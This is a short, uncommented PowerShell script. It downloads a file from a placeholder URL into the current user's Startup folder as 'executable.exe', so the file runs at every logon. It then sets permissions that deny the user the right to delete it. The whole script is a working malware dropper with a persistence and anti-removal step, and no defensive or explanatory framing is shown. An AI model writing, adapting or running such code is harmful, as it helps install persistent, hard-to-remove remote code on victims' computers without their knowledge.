$URL = "URL"
$DestPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\executable.exe"

if (!(Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")) {
    New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
}

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $DestPath)

$Acl = Get-Acl -Path $DestPath
$Ar = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME,"ReadAndExecute","Allow")
$Acl.SetAccessRule($Ar)
$Ad = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME,"Delete","Deny")
$Acl.SetAccessRule($Ad)
Set-Acl -Path $DestPath -AclObject $Acl
